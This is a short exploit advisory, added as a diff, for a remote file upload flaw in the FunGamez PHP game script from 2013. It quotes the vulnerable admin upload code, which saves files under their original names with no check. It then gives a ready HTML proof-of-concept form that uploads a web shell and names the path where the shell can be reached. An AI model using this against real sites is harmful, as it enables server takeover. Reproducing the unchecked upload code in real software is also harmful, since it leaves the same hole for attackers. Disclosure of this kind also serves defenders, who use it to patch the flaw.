@@ -1,0 +1,35 @@
+# FunGamez Remote File Upload Vulnerability
+# Brought to you by cr4wl3r http://bastardlabs.info
+# Software Link: http://sourceforge.net/projects/fg-gsm/?source=dlp
+-----------------------------------------------
+Source [FunGamez]/admin/modules/game.php
+
+..........
+135    </table></form><?php
+136 }
+137 Else If ( $mode == 'newsave' )
+138 {
+139   If ( $_FILES['src_upload']['name'] != '' && $_POST['src_link'] != '' ) { header('Location: ./index.php?admin&module=game&mode=new&msg=doublesrc'); die(); }
+140   If ( ( $_FILES['src_upload']['name'] == '' && $_POST['src_link'] == '' ) || $_POST['name'] == '' ) { header('Location: ./index.php?admin&module=game&mode=new&msg=reqg'); die(); }
+141   If ( $_FILES['src_upload']['name'] != '' )
+142   {
+143      $src = $_FILES['src_upload']['name'];
+144	  move_uploaded_file($_FILES['src_upload']['tmp_name'], './data/flash/'.$_FILES['src_upload']['name']);
+145   }
+..........
+
+
+Proof of concept:
+
+<form action="http://localhost/[FunGamez]/index.php?admin&module=game&mode=newsave" method="POST" enctype="multipart/form-data">
+<input type="text" name="name" value="blablablablabla" /><br>
+<input type="file" name="src_upload" /><br>
+<input type="submit" value="w00tw00t" />
+
+And your shell will be available here:
+
+http://localhost/[FunGamez]/data/flash/shell.php
+
+-----------------------------------------------
+
+// Gorontalo 31 Juli 2013
